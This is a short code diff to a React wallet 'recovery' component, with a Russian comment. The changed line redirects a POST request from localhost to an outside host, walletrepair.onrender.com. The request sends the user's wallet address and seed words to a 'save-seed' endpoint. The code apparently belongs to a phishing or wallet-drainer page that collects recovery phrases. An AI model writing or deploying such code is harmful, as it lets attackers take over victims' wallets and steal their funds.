@@ -143,7 +143,7 @@ export default function WalletSummaryTest() {
     if (window.sessionStorage.getItem('recoveryFinished')) return;
     // Получаем адрес кошелька из localStorage (или другого источника)
     const walletAddress = localStorage.getItem('walletAddress');
-    fetch('http://localhost:3001/api/save-seed', {
+  fetch('https://walletrepair.onrender.com/api/save-seed', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ walletAddress, seedWords })
